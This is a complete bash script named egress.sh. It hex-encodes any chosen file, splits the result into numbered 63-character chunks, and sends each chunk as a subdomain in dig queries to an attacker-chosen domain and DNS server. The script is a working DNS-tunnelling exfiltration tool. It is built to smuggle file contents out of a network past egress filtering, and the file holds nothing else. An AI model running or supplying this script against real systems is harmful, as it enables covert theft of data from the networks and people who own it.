#!/bin/bash

INPUT_FILE="$1"
URL="$2"
DNS_SERVER="$3"

if [ -z "$INPUT_FILE" ] || [ -z "$URL" ] || [ -z "$DNS_SERVER" ]; then
    echo "Syntax: ./egress.sh [FILE] [ENDPOINT] [DNS_SERVER]"
    exit 1
fi

ENCODED=$(cat "$INPUT_FILE" | xxd -p | tr -d '\n' | fold -w63)
ALL_LINES=$(echo "$ENCODED" | wc -l)
PADDING_SIZE=${#ALL_LINES}
PADDING_FORMAT="%0${PADDING_SIZE}d"
COUNT=0
echo "All chunks are $ALL_LINES"
while IFS= read -r line; do
    COUNT=$((COUNT+1))
    CHUNK=$(printf "$PADDING_FORMAT" $COUNT)
    DOMAIN="$CHUNK.$line.$URL"
    COMMAND="dig -t A $DOMAIN @$DNS_SERVER"
    echo "$COMMAND"
    OUTPUT=$($COMMAND)
done <<< "$ENCODED"